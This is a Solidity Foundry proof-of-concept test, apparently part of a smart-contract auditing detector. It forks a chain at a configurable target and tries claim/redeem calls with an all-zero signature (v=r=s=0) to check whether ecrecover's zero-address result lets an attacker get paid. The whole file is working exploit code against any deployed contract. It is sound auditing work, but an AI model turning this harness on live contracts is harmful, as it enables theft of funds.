// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- ecrecover returning the zero address
/// @notice Detector: ecrecover-zero. ecrecover does not revert on a malformed
///         signature; it returns address(0). Code that compares the recovered
///         signer without rejecting zero accepts a signature nobody produced.
/// @dev FORK-ONLY. Reference class: the 2021-2022 signature failures (Qubit
///      Finance's unverified deposit path among them). The exploit is exact:
///      v/r/s are chosen so the precompile returns zero, and the comparison
///      against an unset signer passes.
///      Copy to foundry/test/Exploit.t.sol and run via scripts/run-fork-poc.sh.
///      The verdict is the target PAYING OUT on a signature with no signer.
contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// A signature that recovers to address(0): v = 0, r = 0, s = 0.
    function test_zeroSignerAccepted() public {
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        uint256 before = attacker.balance;
        bool paid = false;

        // Two candidate claim shapes; the verdict is value reaching the
        // attacker on a signature with no recoverable signer.
        string[2] memory shapes = ["claim(uint256,uint8,bytes32,bytes32)", "redeem(uint256,uint8,bytes32,bytes32)"];
        for (uint256 i = 0; i < shapes.length && !paid; ++i) {
            vm.prank(attacker);
            (bool ok,) = target.call(abi.encodeWithSignature(shapes[i], uint256(1 ether), uint8(0), bytes32(0), bytes32(0)));
            console.log("zero-signer attempt via", shapes[i], ok);
            paid = ok && attacker.balance > before;
        }

        console.log("attacker balance before/after:", before, attacker.balance);

        assertTrue(
            paid,
            "the zero-signer signature was not accepted. Tried claim(uint256,uint8,bytes32,bytes32) and redeem(uint256,uint8,bytes32,bytes32) with v=r=s=0. This does NOT establish safety: the entry may have another name or argument order, the digest may include fields this harness did not set, or the signer slot may be populated so the zero address does not match. Confirm the target's ecrecover call and whether it rejects address(0)."
        );
    }
}
